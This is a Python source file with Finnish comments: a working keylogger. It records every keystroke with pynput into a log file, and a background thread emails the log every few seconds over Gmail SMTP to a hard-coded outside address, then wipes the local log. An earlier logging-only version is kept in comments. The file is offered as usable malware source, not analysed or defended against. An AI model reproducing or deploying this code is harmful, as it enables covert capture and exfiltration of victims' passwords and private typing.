from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading
import time

# Asetukset
log_file = "keylog.txt"
email_interval = 10  # 10 minuuttia (sekunteina)

# Sähköpostiasetukset
SENDER_EMAIL = "oma.sahkoposti@gmail.com"
SENDER_PASSWORD = "sovellussalasana_tähän"
RECEIVER_EMAIL = "lenniplays12@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Näppäinten tallennus
def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{key.name}]")

# Sähköpostin lähetys
def send_email():
    while True:
        time.sleep(email_interval)
        try:
            with open(log_file, "r", encoding="utf-8") as f:
                log_content = f.read()

            msg = MIMEText(log_content, _charset="utf-8")
            msg["Subject"] = "Keylogger raportti"
            msg["From"] = SENDER_EMAIL
            msg["To"] = RECEIVER_EMAIL

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(SENDER_EMAIL, SENDER_PASSWORD)
                server.send_message(msg)

            # Tyhjennetään loki onnistuneen lähetyksen jälkeen
            with open(log_file, "w", encoding="utf-8") as f:
                f.write("")
        except Exception as e:
            print("Virhe sähköpostin lähetyksessä:", e)

# Käynnistä kuuntelija ja sähköpostisäie
email_thread = threading.Thread(target=send_email, daemon=True)
email_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

# eka versio
# from pynput import keyboard

# log_file = "keylog.txt"

# def on_press(key):
#     try:
#         with open(log_file, "a", encoding="utf-8") as f:
#             f.write(f"{key.char}")
#     except AttributeError:
#         # Esimerkiksi shift, enter jne.
#         with open(log_file, "a", encoding="utf-8") as f:
#             f.write(f"[{key.name}]")

# # Käynnistetään kuuntelija
# with keyboard.Listener(on_press=on_press) as listener:
#     listener.join()
